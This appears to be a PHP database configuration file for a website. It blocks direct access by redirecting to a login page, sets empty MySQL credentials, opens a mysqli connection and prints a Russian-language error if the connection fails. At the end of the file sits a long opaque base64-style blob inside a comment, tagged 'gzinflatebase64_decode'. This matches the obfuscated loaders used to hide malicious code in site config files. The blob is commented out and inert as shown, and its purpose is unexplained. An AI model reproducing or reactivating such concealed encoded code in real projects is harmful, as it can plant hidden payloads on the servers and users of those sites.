<?php
	if (!defined('ABSOLUTE__PATH__'))
	{
	die ("<meta http-equiv=refresh content='0; url=http://".$_SERVER['HTTP_HOST']."/kpp.php?login'>");
	}

	$hostDB = '';
	$userDB = '';
	$passDB = '';
	$baseDB = '';
	
	$mysql = mysqli_connect($hostDB,$userDB,$passDB,$baseDB);
            
	mysqli_set_charset($mysql, "utf8");

	if (!$mysql) { 
	printf("Невозможно подключиться к базе данных. Код ошибки: %s\n", mysqli_connect_error()); 
	exit; 
	}

//zZZRb5swFIWf4VdY1R6IlIeQKtOkaQ8MsS0SSaWESXtDDritB7ZT20SFXz8gSRunvVkyEi1PyPqwuff4HGPbsi1Wqqecxk8FkaXzoR31b/xZ4EUBiryvYYDG39D0LkLBr/E8miN/NokrnOEqVkJpx7ZoiijXCBdaxJQnkjBSD5eSMixLlJGyb1scM4JWWCaPWDq3g0GvXXH6MwxrqDTWhWoWcW5NQLSm/EEhTZ71C7CtHgqm38fT4MukHM+9CfJ/eDPPj4IZmgcRKvT9J+TfhWHTQTOIHwgnEudxQm96n6265w5dH9kwThnl8fpNxzX7rQpFJKiGJvkLG5kIp5KoHWhShik4U9Md/d2hwXjBFjv1DAf7FEKZyFcCgm2ty9ohYL0p1tiFimrgEII6g9WjS9hndTXbLflokJUhq4HE4jdhEGTE6M/8GixcIriWIgcLJc+1BwzP9xvPimVeqwLq2RiQ1oRTAr6TVa/yuPtI66x6hLHKqoRDWBPJBAQvleROQY4TwZrgHhno9ZxtoN3X/tBf0n4oepsSzqpKN1G0qEs9hyTtQqDDzaNjtB+P86vS8dSP72lOusrSZFRApPkAGFvj97kPr8lEKstx6mx2HwgE/Nv4T0Wf4vnDtibpJfr6Z+u2uxFz3D4WWB3r4Oa3jVfb7Ru9Pc7aXTWPsp1LnHtlnZ+yv5sp7zv3oC4HHA/Yos0ufIG4upys2z/JQ/Bd7FIXgj8=//gzinflatebase64_decode;

?>
